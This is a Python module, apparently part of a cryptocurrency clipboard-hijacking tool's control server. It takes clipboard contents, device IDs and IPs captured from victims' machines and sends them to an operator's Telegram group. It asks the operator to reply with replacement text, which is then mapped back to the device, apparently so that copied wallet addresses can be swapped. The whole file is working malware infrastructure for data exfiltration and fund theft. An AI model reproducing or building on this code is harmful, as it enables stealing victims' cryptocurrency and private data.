"""Telegram推送功能"""
import time
from typing import Optional
import aiohttp
from db import get_session, SysSettings


async def send_address_to_telegram(device_id: str, ip: str, note: str, clipboard_text: str, address_type: str = "未知地址") -> Optional[int]:
    """
    发送加密货币地址信息到Telegram群组
    返回消息ID用于后续回复关联
    """
    # 从数据库获取Telegram配置
    with get_session() as db:
        bot_token = db.query(SysSettings).filter(SysSettings.key == "tg_bot_token").first()
        chat_id = db.query(SysSettings).filter(SysSettings.key == "tg_chat_id").first()
        
        if not bot_token or not bot_token.value or not chat_id or not chat_id.value:
            print("Telegram配置未设置")
            return None
    
    # 构建消息，包含设备信息标记
    message = f"""设备id: {device_id}
ip: {ip or '未知'}
备注: {note or '无'}
剪切板内容: {clipboard_text}
类型: {address_type}
如替换该内容请直接使用替换内容回复此消息

#device_{device_id}"""
    
    # 发送到Telegram
    url = f"https://api.telegram.org/bot{bot_token.value}/sendMessage"
    
    payload = {
        "chat_id": chat_id.value,
        "text": message,
        "parse_mode": "HTML"
    }
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(url, json=payload) as resp:
                if resp.status == 200:
                    result = await resp.json()
                    message_id = result.get("result", {}).get("message_id")
                    print(f"成功发送{address_type}到Telegram: {clipboard_text}, 消息ID: {message_id}")
                    
                    # 保存消息ID和设备ID的映射关系
                    if message_id:
                        from db import MessageDeviceMapping
                        with get_session() as db:
                            mapping = MessageDeviceMapping(
                                message_id=message_id,
                                device_id=device_id,
                                created_at=int(time.time())
                            )
                            db.add(mapping)
                            db.commit()
                    
                    return message_id
                else:
                    error = await resp.text()
                    print(f"发送到Telegram失败: {error}")
                    return None
    except Exception as e:
        print(f"发送到Telegram时出错: {e}")
        return None
